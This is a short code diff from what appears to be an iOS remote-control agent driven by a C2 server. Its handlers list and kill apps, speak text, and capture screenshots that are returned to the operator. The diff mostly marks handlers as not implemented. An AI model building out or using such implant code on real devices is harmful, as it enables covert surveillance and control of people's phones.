@@ -110,9 +110,6 @@ int SBSOpenSensitiveURLAndUnlock(CFURLRef url, char flags);
 -(BOOL)getVolume:(float *)volume forCategory:(id)category;
 @end
 
-@implementation AVSystemController
-@end
-
 static tlv_pkt_t *ui_app_list(c2_t *c2)
 {
     tlv_pkt_t *result;
@@ -280,12 +277,12 @@ static tlv_pkt_t *ui_backlight_set(c2_t *c2)
     tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &level);
     delta = level * 0.1;
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
 }
 
 static tlv_pkt_t *ui_kill_apps(c2_t *c2)
 {
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
 }
 
 static tlv_pkt_t *ui_kill_app(c2_t *c2)
@@ -296,19 +293,20 @@ static tlv_pkt_t *ui_kill_app(c2_t *c2)
     tlv_pkt_add_string(c2->request, TLV_TYPE_STRING, bundle_id);
 
     bundleID = [NSString stringWithUTF8String:bundle_id];
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
 }
 
 static tlv_pkt_t *ui_say(c2_t *c2)
 {
     char phrase[1024];
     NSString *phraseSay;
+    NSError *error;
 
     tlv_pkt_get_string(c2->request, TLV_TYPE_STRING, phrase);
 
     phraseSay = [NSString stringWithUTF8String:phrase];
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
 }
 
 static tlv_pkt_t *ui_screenshot(c2_t *c2)
@@ -320,7 +318,7 @@ static tlv_pkt_t *ui_screenshot(c2_t *c2)
     image = UIGraphicsGetImageFromCurrentImageContext();
     imageData = UIImagePNGRepresentation(image);
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED);
     tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, (unsigned char *)imageData.bytes, imageData.length);
 
     return result;
